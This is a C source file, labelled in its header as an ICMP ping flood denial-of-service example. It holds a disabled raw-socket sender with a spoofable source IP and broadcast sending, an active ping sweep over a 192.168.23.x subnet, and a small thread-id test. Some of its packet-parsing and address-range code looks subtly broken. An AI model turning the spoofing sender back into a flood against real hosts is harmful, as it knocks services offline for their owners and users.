/**
    ICMP ping flood dos attack example in c
    Silver Moon
    m00n.silv3r@gmail.com
*/
  
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <unistd.h>

#include <sys/time.h>
#include <time.h>

#include <sys/select.h>

/* According to earlier standards */
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#if 1

#if 0
typedef unsigned char u8;
typedef unsigned short int u16;
 
unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(const char *p);

int main(int argc, char **argv)
{
    fd_set rfds;

    if (argc < 3) 
    {
        printf("usage: %s <source IP> <destination IP> [payload size]\n", argv[0]);
        exit(0);
    }
     
    unsigned long daddr;
    unsigned long saddr;
    int payload_size = 0, sent, sent_size;

    saddr = inet_addr(argv[1]);
    daddr = inet_addr(argv[2]);
     
    if (argc > 3)
    {
        payload_size = atoi(argv[3]);
    }
     
    //Raw socket - if you use IPPROTO_ICMP, then kernel will fill in the correct ICMP header checksum, if IPPROTO_RAW, then it wont
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP);
     
    if (sockfd < 0) 
    {
        perror("could not create socket");
        return (0);
    }
     
    int on = 1;
     
    // We shall provide IP headers
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
    {
        perror("setsockopt");
        return (0);
    }
     
    //allow socket to send datagrams to broadcast addresses
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
    {
        perror("setsockopt");
        return (0);
    }   
     
    //Calculate total packet size
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);
                    
    if (!packet) 
    {
        perror("out of memory");
        close(sockfd);
        return (0);
    }
     
    //ip header
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
     
    //zero out the packet buffer
    memset (packet, 0, packet_size);
 
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
    //ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));
 
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.sequence = rand();
    icmp->un.echo.id = rand();
    //checksum
    icmp->checksum = 0;
     
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = daddr;
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
 
    printf ("SEND packet:\n");
    printf ("ip->version %d\n", ip->version);
    printf ("ip->ihl %d\n", ip->ihl);
    printf ("ip->tos %d\n", ip->tos);
    printf ("ip->tot_len %d\n", ip->tot_len);
    printf ("ip->id %d\n", ip->id);
    printf ("ip->frag_off %d\n", ip->frag_off);
    printf ("ip->ttl %d\n", ip->ttl);
    printf ("ip->protocol %d\n", ip->protocol);
    printf ("ip->saddr %08x\n", ip->saddr);
    printf ("ip->daddr %08x\n", ip->daddr);
    printf ("icmp->type %d\n", icmp->type);
    printf ("icmp->code %d\n", icmp->code);
    printf ("icmp->un.echo.sequence %d\n", icmp->un.echo.sequence);
    printf ("icmp->un.echo.id %d\n", icmp->un.echo.id);
    printf ("icmp->checksum %x\n", icmp->checksum);

    FD_ZERO(&rfds);
    FD_SET(sockfd, &rfds);

    // while (1)
    // {
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
         
        //recalculate the icmp header checksum since we are filling the payload with random characters everytime
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
         
        if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
        {
            perror("send failed\n");
            // break;
        }

        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);

        int addrlen = 0;

        // servaddr.sin_family = AF_INET;
        // servaddr.sin_addr.s_addr = inet_addr("192.168.23.137");
        // memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        if(select (sockfd + 1, &rfds, NULL, NULL, &tv))
        {
            if(FD_ISSET(sockfd, &rfds))
            {
                recvfrom(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, &addrlen);
                // if (sent_size > 1)
                {
                    printf ("RECV packet:\n");

                    ip = (struct iphdr *) packet;
                    icmp = (struct icmphdr *) (ip + sizeof (struct iphdr));

                    printf ("ip->version %d\n", ip->version);
                    printf ("ip->ihl %d\n", ip->ihl);
                    printf ("ip->tos %d\n", ip->tos);
                    printf ("ip->tot_len %d\n", ip->tot_len);
                    printf ("ip->id %d\n", ip->id);
                    printf ("ip->frag_off %d\n", ip->frag_off);
                    printf ("ip->ttl %d\n", ip->ttl);
                    printf ("ip->protocol %d\n", ip->protocol);
                    printf ("ip->saddr %08x\n", ip->saddr);
                    printf ("ip->daddr %08x\n", ip->daddr);
                    printf ("icmp->type %d\n", icmp->type);
                    printf ("icmp->code %d\n", icmp->code);
                    printf ("icmp->un.echo.sequence %d\n", icmp->un.echo.sequence);
                    printf ("icmp->un.echo.id %d\n", icmp->un.echo.id);
                    printf ("icmp->checksum %x\n", icmp->checksum);
                }
            }
        } else {
            printf("?!?!?!?!?!\n");
        }




        // ++sent;
        // printf("%d packets sent\r", sent);
        // fflush(stdout);
         
        usleep(10000);  //microseconds
    // }
     
    free(packet);
    close(sockfd);
     
    return (0);
}
 
/*
    Function calculate checksum
*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;
 
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
 
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
 
    return (answer);
}
#else

#include "icmp_core.h"

struct timeval start;

int pb_clockgettime(struct timeval* tv)
{
    int ret = -1;
    struct timespec ts;

    if (!tv)
        return ret;

    ret = clock_gettime(CLOCK_MONOTONIC, &ts);

    if (ret == 0)
    {
        tv->tv_sec = ts.tv_sec;
        tv->tv_usec = ts.tv_nsec / 1000;

        if (ts.tv_nsec % 1000 >= 500)
        {
            if (++tv->tv_usec == 1000000)
            {
                tv->tv_usec = 0;
                ++tv->tv_sec;
            }
        }
    }

    return ret;
}

void ping_result (char *dest_address, icmp_result_t *error)
{
    static int ip_count = 0;

    // if (!error->err_total)
    // {
    //     printf ("%d] ping '%s' success. delay %ld.%06ld sec\n", ip_count++,
    //             dest_address, error->delay.tv_sec, error->delay.tv_usec);
    // } else {
    //     printf ("%d] ping '%s' failed. error: %d [err: %s%s%s%s%s] delay %ld.%06ld sec\n", ip_count++,
    //             dest_address, error->err_total,
    //             error->err_type? " type":"",
    //             error->err_code? " code":"",
    //             error->err_timeout? " timeout":"",
    //             error->err_send? " send":"",
    //             error->err_mem? " memory":"",
    //             error->delay.tv_sec, error->delay.tv_usec);
    // }

    // if (send_result)
    //     printf ("%s: ping '%s' failed. error: %d\n", __func__, dest_address, send_result);
    // else
    //     printf ("%s: ping '%s' success\n", __func__, dest_address);
}

void send_ended (void)
{
    struct timeval finish;
    struct timeval diff;

    pb_clockgettime (&finish);

    timersub(&finish, &start, &diff);

    printf ("Time debug: %ld.%06ld sec\n", diff.tv_sec, diff.tv_usec);

    exit(0);
}

uint32_t bit_mask (int bits)
{
    int i = 0;
    uint32_t bitmask = 0;

    for (i = 0; i < bits; i++)
    {
        bitmask |= 1 << i;
    }

    return bitmask;
}

void send_ping_range (char *ip_source, char *ip_start, char *ip_end, char *mask)
{
    int i, mask_bits;
    icmp_callback_t callbacks;
    icmp_addr_in_t icmp_addr_in;
    icmp_addr_t icmp_source;
    icmp_addr_t *icmp_dest;
    uint32_t net_source, net_start;
    uint32_t net_end, net_mask;
    uint32_t host_count;
    struct in_addr dest_ip;

    net_source = inet_addr(ip_source);
    net_start = inet_addr(ip_start);
    net_end = inet_addr(ip_end);

    if (mask[0] == '/')
    {
        mask++; /* cat '/' */
        mask_bits = atoi (mask);
        net_mask = bit_mask(mask_bits);
    } else {
        net_mask = inet_addr(mask);
    }

    strcpy (icmp_source.addr, ip_source);

    host_count = ntohl(net_end - (net_start & net_mask));

    icmp_dest = (icmp_addr_t *) calloc (1, sizeof (icmp_addr_t) * host_count);
    if (!icmp_dest)
    {
        printf ("!!!!!!!!!!!!!!!!1\n");
        return;
    }

    for (i = 0; i < host_count; i++)
    {
        dest_ip.s_addr = net_start + (i << mask_bits);
        inet_ntop(AF_INET, &dest_ip, icmp_dest[i].addr, INET_ADDRSTRLEN);
        // printf ("translate: %d\n", );

        // printf ("dest_ip.s_addr 0x%08x : %s\n", dest_ip.s_addr, icmp_dest[i].addr);
    }

    memset (&icmp_addr_in, 0, sizeof (icmp_addr_in));

    icmp_addr_in.source = &icmp_source;
    icmp_addr_in.dest = icmp_dest;
    icmp_addr_in.dest_count = host_count;

    callbacks.req_result = &ping_result;
    callbacks.send_finished = &send_ended;

    icmp_send (&icmp_addr_in, &callbacks);

    free(icmp_dest);
}

#define MAX_DEST_ADDR 5

void icmp_try_send (void)
{
    int dest_count = 0;

    icmp_addr_t icmp_source;
    icmp_addr_t icmp_dest[MAX_DEST_ADDR];

    strcpy (icmp_source.addr, "192.168.23.51");

    strcpy (icmp_dest[dest_count++].addr, "192.168.23.51");
    strcpy (icmp_dest[dest_count++].addr, "192.168.23.1");
    strcpy (icmp_dest[dest_count++].addr, "192.168.23.123");
    strcpy (icmp_dest[dest_count++].addr, "192.168.23.137");
    strcpy (icmp_dest[dest_count++].addr, "192.168.23.175");

    icmp_addr_in_t icmp_addr_in;

    memset (&icmp_addr_in, 0, sizeof (icmp_addr_in));

    icmp_addr_in.source = &icmp_source;
    icmp_addr_in.dest = icmp_dest;
    icmp_addr_in.dest_count = MAX_DEST_ADDR;

    // icmp_send (&icmp_addr_in, &ping_result);

    printf ("%s - done\n", __func__);
}

int main (void)
{
    pb_clockgettime (&start);

    // icmp_try_send();
    send_ping_range ("192.168.23.51", "192.168.23.1",
                     "192.168.23.140", /*"255.255.255.0"*/"/24");

    sleep(60);

    return 0;
}

#endif

#else
#include <pthread.h>
#include <stdio.h>

void print_thread_id(pthread_t id)
{
    size_t i;
    for (i = sizeof(i); i; --i)
        printf("%02x", *(((unsigned char*) &id) + i - 1));
}

int main()
{
    pthread_t id = pthread_self();

    printf("%08x\n", id);
    print_thread_id(id);

    return 0;
}
#endif